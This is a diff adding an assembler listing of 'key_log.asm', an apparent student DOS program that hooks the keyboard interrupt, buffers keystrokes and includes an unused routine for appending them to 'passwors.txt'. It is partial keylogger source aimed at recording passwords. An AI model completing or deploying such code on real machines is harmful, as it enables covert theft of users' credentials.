@@ -1,0 +1,407 @@
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 1
+key_log.asm
+
+
+
+      1				     locals @@
+      2	0000			     .model tiny
+      3				     .186
+      4
+      5				     ;extrn Draw_Shadow_Rect:proc
+      6
+      7	0000			     .code
+      8				     org 100h
+      9
+     10	0100			     Start:
+     11
+     12	0100  E9 0136		     jmp Next
+     13				     ;---------------------------------DEFINES--------------------------------
+     14	      =B800		     GRAPHIC_PTR equ 0b800h
+     15	      =204E		     LETTER_STYLE equ 204eh
+     16	      =0014		     X_POINT equ 20
+     17	      =0008		     Y_POINT equ 8
+     18	      =001E		     LENGTH equ	30
+*Warning* key_log.asm(18) Reserved word	used as	symbol:	LENGTH
+     19	      =000C		     HEIGHT equ	12
+     20	      =0039		     HOT_KEY equ 39h			     ;Space
+     21	      =090C		     MID equ (80 * 14 +	38) * 2
+     22
+     23	0103  00		     buff_ptr db 0
+     24	0104  41 4E 41 4E 41 53	00   Text: db "ANANAS",	0
+     25	010B  44 52 41 47 4F 4E	20+  Tittle: db	"DRAGON	X", 0
+     26	      58 00
+     27	0114  57 3A 5C 41 53 4D	5F+  File_Name:	db "W:\ASM_PROG\KEY_LOGE\passwors.txt",	0
+     28	      50 52 4F 47 5C 4B	45+
+     29	      59 5F 4C 4F 47 45	5C+
+     30	      70 61 73 73 77 6F	72+
+     31	      73 2E 74 78 74 00
+     32	0136  ????		     handler dw	?
+     33
+     34	0138  0101*(00)		     buffer db 257 dup (0)
+     35	      =0024		     int9_vect equ 36
+     36	      =0070		     int28_vect	equ 4d * 28d
+     37				     ;------------------------------------------------------------------------
+     38
+     39	0239			     Next:
+     40	0239  33 C0			     xor ax, ax		     ;ax = 0
+     41	023B  8E C0			     mov es, ax		     ;es = 0
+     42
+     43	023D  FA			     cli
+     44
+     45
+     46	023E  26: A1 0024		     mov ax, word ptr es:[int9_vect]	     ; first two bytes of interuprion
+     47	0242  A3 0274r			     mov inter09, ax
+     48	0245  26: A1 0026		     mov ax, word ptr es:[int9_vect + 2]     ; second two bytes
+     49	0249  A3 0276r			     mov inter09 + 2, ax
+     50
+     51	024C  26: A1 0070		     mov ax, word ptr es:[int28_vect]
+     52	0250  A3 0278r			     mov inter28, ax
+     53	0253  26: A1 0072		     mov ax, word ptr es:[int28_vect + 2]
+     54	0257  A3 027Ar			     mov inter28 + 2, ax
+     55
+     56
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 2
+key_log.asm
+
+
+
+     57	025A  26: C7 06	0024 027Cr	     mov word ptr es:[int9_vect], offset New09	     ; put the adress of the new handler
+     58					     ;mov word ptr es:[int28_vect], offset New28
+     59
+     60	0261  8C C8			     mov ax, cs
+     61	0263  26: A3 0026		     mov word ptr es:[int9_vect+2], ax
+     62					     ;mov word ptr es:[int28_vect+2], ax
+     63	0267  FB			     sti
+     64
+     65	0268  B8 3100			     mov ax, 3100h				     ;31th function in ah
+     66	026B  BA 039Er			     mov dx, offset EndLabel		     ;memory size to keep resident
+     67	026E  C1 EA 04			     shr dx, 4						     ;in 16-byte paragraphs
+     68	0271  42			     inc dx
+     69	0272  CD 21			     int 21h
+     70
+     71	0274  0000			     inter09 dw	0
+     72	0276  0000				      dw 0
+     73
+     74	0278  0000			     inter28 dw	0
+     75	027A  0000				      dw 0
+     76
+     77
+     78	027C			     New09 proc
+     79
+     80	027C  50 53 51 52 06 1E	56+	     push ax bx	cx dx es ds si di bp
+     81	      57 55
+     82
+     83	0285  8C C8			     mov ax, cs
+     84	0287  8E C0			     mov es, ax
+     85
+     86	0289  E4 60			     in	al, 60h						     ;put value	of the 60th port    +
+     87				     into al
+     88
+     89
+     90	028B  50 53 51 52 06 1E	56+	     push ax bx	cx dx es ds si di bp
+     91	      57 55
+     92
+     93	0294  9C			     pushf
+     94	0295  2E: FF 1E	0274r		     call dword	ptr cs:[inter09]
+     95
+     96	029A  5D 5F 5E 1F 07 5A	59+	     pop bp di si ds es	dx cx bx ax
+     97	      5B 58
+     98
+     99	02A3  B4 01			     mov ah, 01h
+    100	02A5  CD 16			     int 16h
+    101
+    102	02A7  BB B800			     mov bx, GRAPHIC_PTR
+    103	02AA  8E C3			     mov es, bx
+    104	02AC  26: A2 090C		     mov byte ptr es:[MID], al
+    105
+    106	02B0  E8 002F			     call Write_Buff
+    107
+    108	02B3  8C C8			     mov ax, cs
+    109	02B5  8E D8			     mov ds, ax
+    110	02B7  B0 4E			     mov al, 4eh
+    111	02B9  BE 0138r			     mov si, offset buffer
+    112	02BC  B3 1E			     mov bl, 30
+    113	02BE  B7 04			     mov bh, 4
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 3
+key_log.asm
+
+
+
+    114	02C0  E8 00A9			     call Printf
+    115
+    116
+    117	02C3  5D 5F 5E 1F 07 5A	59+	     pop bp di si ds es	dx cx bx ax
+    118	      5B 58
+    119
+    120	02CC  CF			     iret
+    121					     ;ret
+    122	02CD				     endp
+    123
+    124
+    125	02CD			     New28 proc
+    126
+    127				     ;push ax bx cx dx es di si
+    128
+    129				     ;cmp byte ptr buff_ptr, 0
+    130				     ;jbe @@Next
+    131
+    132				     ;call Write_File
+    133
+    134				     ;@@Next:
+    135				     ;pop si di	es dx cx bx ax
+    136
+    137	02CD  50 53 51 52 06 57	56   push ax bx	cx dx es di si
+    138	02D4  9C		     pushf
+    139	02D5  2E: FF 1E	0278r	     call dword	ptr cs:[inter28]
+    140
+    141	02DA  5E 5F 07 5A 59 5B	58   pop si di es dx cx	bx ax
+    142
+    143	02E1  CF		     iret
+    144	02E2			     endp
+    145
+    146
+    147				     ;-----------------------------------------WRITE_BUFF------------------------
+    148				     ; Puts a symbol into buffer.
+    149				     ;			     Input:
+    150				     ;					     AL	- symbol to write into the buffer
+    151				     ;			     Destr:
+    152				     ;					     AL, BX
+    153				     ;-----------------------------------------------------------------------------
+    154
+    155	02E2				     Write_Buff	proc
+    156
+    157	02E2  BB 0138r			     mov bx, offset buffer
+    158	02E5  02 1E 0103r		     add bl, byte ptr buff_ptr
+    159	02E9  FE CB			     dec bl
+    160	02EB  3C 79			     cmp al, 79h
+    161	02ED  77 0F			     ja	@@Next
+    162	02EF  3C 00			     cmp al, 0
+    163	02F1  74 0B			     je	@@Next
+    164	02F3  2E: 88 07			     mov byte ptr cs:[bx], al
+    165
+    166	02F6  A0 0103r			     mov al, byte ptr buff_ptr
+    167	02F9  FE C0			     inc al
+    168	02FB  A2 0103r			     mov byte ptr buff_ptr, al
+    169
+    170	02FE			     @@Next:
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 4
+key_log.asm
+
+
+
+    171
+    172	02FE  C3			     ret
+    173	02FF				     endp
+    174
+    175				     ;-----------------------------------------WRITE_FILE------------------------
+    176				     ;		     Input: File_Name -	file name
+    177				     ;		     Destr: AX,	BX, CX,	DX
+    178				     ;------------------------------------------------------------------------------
+    179
+    180	02FF			     Write_File	proc
+    181
+    182	02FF  50 53 51 52 56 57	1E+		     push ax bx	cx dx si di ds es
+    183	      06
+    184
+    185	0307  B8 B800				     mov ax, 0b800h
+    186	030A  8E C0				     mov es, ax
+    187
+    188	030C  26: C7 06	090C 4E01		     mov word ptr es:[MID], 4e01h
+    189
+    190	0313  8C C8				     mov ax, cs
+    191	0315  8E D8				     mov ds, ax
+    192
+    193	0317  B8 3D01				     mov ax, 3d01h
+    194	031A  BA 0114r				     mov dx, offset File_Name
+    195	031D  CD 21				     int 21h
+    196
+    197	031F  A3 0136r				     mov handler, ax				     ;handler
+    198	0322  8B D8				     mov bx, ax
+    199
+    200	0324  8B 1E 0136r			     mov bx, word ptr handler
+    201	0328  B8 4202				     mov ax, 4202h				     ;move pointer to the end of the+
+    202				     file
+    203	032B  33 C9				     xor cx, cx
+    204	032D  33 D2				     xor dx, dx
+    205	032F  CD 21				     int 21h						     ;position of the end of+
+    206				     the file is in AX
+    207
+    208	0331  8C CA				     mov dx, cs
+    209	0333  8E DA				     mov ds, dx
+    210	0335  BA 0138r				     mov dx, offset buffer
+    211	0338  33 C9				     xor cx, cx
+    212	033A  8A 0E 0103r			     mov cl, byte ptr buff_ptr					     ;cx = length
+    213	033E  B4 40				     mov ah, 40h								    +
+    214				     ;write to file
+    215	0340  CD 21				     int 21h
+    216
+    217
+    218	0342  8B 1E 0136r			     mov bx, word ptr handler
+    219	0346  B4 3E				     mov ah, 3eh				     ;close file
+    220	0348  CD 21				     int 21h
+    221
+    222	034A  FC				     cld
+    223	034B  33 C9				     xor cx, cx
+    224	034D  8A 0E 0103r			     mov cl, buff_ptr			     ;clean the	buffer
+    225	0351  FE C1				     inc cl
+    226	0353  8C C8				     mov ax, cs
+    227	0355  8E C0				     mov es, ax
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 5
+key_log.asm
+
+
+
+    228	0357  B0 00				     mov al, 0
+    229	0359  BF 0138r				     mov di, offset buffer
+    230	035C  F3> AA				     rep stosb
+    231
+    232	035E  C6 06 0103r 01			     mov byte ptr buff_ptr, 1	     ;clean the	pointer
+    233
+    234	0363  07 1F 5F 5E 5A 59	5B+		     pop es ds di si dx	cx bx ax
+    235	      58
+    236	036B  C3		     ret
+    237	036C			     endp
+    238
+    239				     ;-------------------------------------------------------------------------
+    240				     ;++++++++++++++++++++++++++++++++++++++++PRINTF+++++++++++++++++++++++++++++++++
+    241				     ;	     Draws a message in	point (start_x,	start_y). Inserts symbols with a particular ;color.
+    242				     ;		     Entry:
+    243				     ;				     ES	- video	memory
+    244				     ;				     DS	- segment with the string
+    245				     ;				     AL	- color
+    246				     ;				     BL	- start_x
+    247				     ;				     BH	- start_y
+    248				     ;				     SI	- pointer to the text
+    249				     ;		     Destr:  DX, DI, BX, SI
+    250				     ;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    251
+    252	036C					     Printf proc
+    253
+    254	036C  8B D0					     mov dx, ax
+    255	036E  B0 50					     mov al, 80
+    256	0370  F6 E7					     mul bh
+    257	0372  02 C3					     add al, bl
+    258	0374  D1 E0					     shl ax, 1
+    259	0376  8B F8					     mov di, ax
+    260	0378  8B C2					     mov ax, dx
+    261
+    262	037A  57 56				     push di si
+    263	037C  33 DB				     xor bx, bx
+    264	037E					     @@Cycle:
+    265	037E  8B 1C				     mov bx, ds:[si]
+    266	0380  80 FB 00				     cmp bl, 0
+    267	0383  74 07				     je	@@Exit
+    268	0385  A4				     movsb
+    269	0386  26: 88 05				     mov byte ptr es:[di], al
+    270	0389  47				     inc di
+    271	038A  EB F2				     jmp @@Cycle
+    272
+    273	038C					     @@Exit:
+    274	038C  5E 5F				     pop si di
+    275	038E  C3				     ret
+    276	038F					     endp
+    277
+    278				     ;-----------------------------STRLEN------------------------------
+    279				     ;The program returns the length of	the string up to symbol	'\0'
+    280				     ;
+    281				     ;		     Entry:  DS	- segment with a string
+    282				     ;				     DI	- pointer to the string	in the segment
+    283				     ;
+    284				     ;		     Return value:
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 6
+key_log.asm
+
+
+
+    285				     ; Returns value in	AX: length of the string
+    286				     ;
+    287				     ;-----------------------------------------------------------------
+    288
+    289	038F			     strlen proc
+    290
+    291	038F  57		     push di
+    292	0390  B8 0000		     mov ax, 0
+    293	0393			     @@Cycle:
+    294	0393  80 3D 00		     cmp byte ptr ds:[di], 0
+    295	0396  74 04		     je	@@End
+    296	0398  47		     inc di
+    297	0399  40		     inc ax
+    298	039A  EB F7		     jmp @@Cycle
+    299
+    300	039C			     @@End:
+    301	039C  5F		     pop di
+    302	039D  C3		     ret
+    303	039E			     endp
+    304				     ;-------------------------------------------------------------------
+    305
+    306	039E				     EndLabel:
+    307					     end Start
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 7
+Symbol Table
+
+
+
+
+Symbol Name			  Type	 Value
+
+??DATE				  Text	 "03/11/20"
+??FILENAME			  Text	 "key_log "
+??TIME				  Text	 "03:35:09"
+??VERSION			  Number 040A
+@32BIT				  Text	 0
+@@CYCLE				  Near	 DGROUP:037E
+@@CYCLE				  Near	 DGROUP:0393
+@@END				  Near	 DGROUP:039C
+@@EXIT				  Near	 DGROUP:038C
+@@NEXT				  Near	 DGROUP:02FE
+@CODE				  Text	 DGROUP
+@CODESIZE			  Text	 0
+@CPU				  Text	 0103H
+@CURSEG				  Text	 _TEXT
+@DATA				  Text	 DGROUP
+@DATASIZE			  Text	 0
+@FILENAME			  Text	 KEY_LOG
+@INTERFACE			  Text	 000H
+@MODEL				  Text	 1
+@STACK				  Text	 DGROUP
+@WORDSIZE			  Text	 2
+BUFFER				  Byte	 DGROUP:0138
+BUFF_PTR			  Byte	 DGROUP:0103
+ENDLABEL			  Near	 DGROUP:039E
+FILE_NAME			  Near	 DGROUP:0114
+GRAPHIC_PTR			  Number B800
+HANDLER				  Word	 DGROUP:0136
+HEIGHT				  Number 000C
+HOT_KEY				  Number 0039
+INT28_VECT			  Number 0070
+INT9_VECT			  Number 0024
+INTER09				  Word	 DGROUP:0274
+INTER28				  Word	 DGROUP:0278
+LENGTH				  Number 001E
+LETTER_STYLE			  Number 204E
+MID				  Number 090C
+NEW09				  Near	 DGROUP:027C
+NEW28				  Near	 DGROUP:02CD
+NEXT				  Near	 DGROUP:0239
+PRINTF				  Near	 DGROUP:036C
+START				  Near	 DGROUP:0100
+STRLEN				  Near	 DGROUP:038F
+TEXT				  Near	 DGROUP:0104
+TITTLE				  Near	 DGROUP:010B
+WRITE_BUFF			  Near	 DGROUP:02E2
+WRITE_FILE			  Near	 DGROUP:02FF
+X_POINT				  Number 0014
+Y_POINT				  Number 0008
+
+Groups & Segments		  Bit Size Align  Combine Class
+
+DGROUP				  Group
+  _DATA				  16  0000 Word	  Public  DATA
+  _TEXT				  16  039E Word	  Public  CODE
+Turbo Assembler	 Version 4.1	    03/11/20 03:35:09	    Page 8
+Error Summary
+
+
+
+*Warning* key_log.asm(18) Reserved word	used as	symbol:	LENGTH
+
